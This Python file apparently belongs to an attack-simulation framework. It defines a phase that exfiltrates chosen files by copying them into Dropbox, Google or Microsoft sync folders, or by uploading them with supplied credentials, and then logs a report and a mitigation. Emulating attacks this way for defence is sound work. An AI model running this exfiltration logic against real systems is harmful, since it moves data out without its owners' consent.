import logging
import shutil
import os
from ai_utils.phases.abstract_phase import AbstractPhaseClass
from ai_utils.scenarios.globals import StringUtils
from ai_utils.cloud.cloud_factory import CloudAgentFactoryClass


class ExFiltrateToCloudDrivesPhaseClass(AbstractPhaseClass):
    TrackerId = "233"
    Subject = "Ex-Filtrate data over cloud drives"
    Description = "Ex-Filtrate data over cloud drives"

    SUPPORTED_DRIVE_TYPES = ['dropbox', 'google', 'microsoft']

    def __init__(self, isPhaseCritical, listOfFilesToExfiltrate, driveType, credentials, sharedFolders):
        AbstractPhaseClass.__init__(self, isPhaseCritical)
        logging.info('Executing ExfiltrateToCloudDrives phase...')
        assert isinstance(listOfFilesToExfiltrate, list)
        assert isinstance(credentials, dict)
        self.ListOfFilesToExfiltrate = listOfFilesToExfiltrate
        self.DriveType = driveType.lower() if  driveType else None
        self.Credentials = credentials
        self.SharedFolders = sharedFolders
        self.CountOfFilesExfiltrated = 0

    def IsSupportedDriveType(self):
        if StringUtils.IsEmptyOrNull(self.DriveType):
            return False
        if self.DriveType not in type(self).SUPPORTED_DRIVE_TYPES:
            logging.error('{0} is not a supported drive'.format(self.DriveType))
            return False
        return True

    def Setup(self):
        return len(self.ListOfFilesToExfiltrate) > 0 and \
              not StringUtils.IsEmptyOrNull(self.DriveType) and \
              self.IsSupportedDriveType() and \
              (self.Credentials.get('userpwd', False) or self.Credentials.get('apikey', False))

    def GetExpandSharedFolders(self):
        expandedSharedFolders = []
        for sf in self.SharedFolders:
            sf = os.path.expanduser(sf)
            if os.path.isdir(sf):
                expandedSharedFolders.append(sf)
        return expandedSharedFolders

    def copy_files_to_shared_folders(self):
        self.PhaseReporter.Info('Copying files to shared folders...')
        self.SharedFolders = self.GetExpandSharedFolders()
        for sf in self.SharedFolders:
            for f in self.ListOfFilesToExfiltrate:
                try:
                    shutil.copy(f, sf) # if the file already exist (same name) an exception is triggered
                    self.CountOfFilesExfiltrated += 1
                except Exception as e:
                    logging.error("Something went wrong copying file {0} to {1}: {2}".format(f, sf, e))
        return self.CountOfFilesExfiltrated > 0

    def Run(self):
        phaseSuccessful = self.copy_files_to_shared_folders()
        if not phaseSuccessful:
            self.PhaseReporter.Info('Uploading files to {0} cloud service...'.format(self.DriveType))
            factory = CloudAgentFactoryClass(self.DriveType, self.Credentials)
            CloudAgent = factory.CreateAgent()
            self.PhaseReporter.Info('Authenticating against {0} cloud service...'.format(self.DriveType))
            if CloudAgent.Authenticate():
                self.PhaseReporter.Info('Authentication successful. Uploading files...')
                phaseSuccessful = CloudAgent.UploadFiles(self.ListOfFilesToExfiltrate)

        if phaseSuccessful:
            self.PhaseResult['copied_files'] = str(self.ListOfFilesToExfiltrate)
            if self.SharedFolders:
                self.PhaseResult['shared_folders'] = str(self.SharedFolders)
                self.PhaseReporter.Info('Successfully copied files to cloud drive shared directory')
            else:
                self.PhaseReporter.Info('Successfully uploaded files to cloud drive')
                self.PhaseReporter.Report('Files were exfiltrated to the {} cloud storage service using the HTTP/S protocol'.format(self.DriveType.capitalize()))
                self.PhaseReporter.Mitigation('Requests to {} cloud storage service should be monitored or prevented'.format(self.DriveType.capitalize()))
        else:
            self.PhaseReporter.Info('Failed to upload files to cloud drive')
        return phaseSuccessful
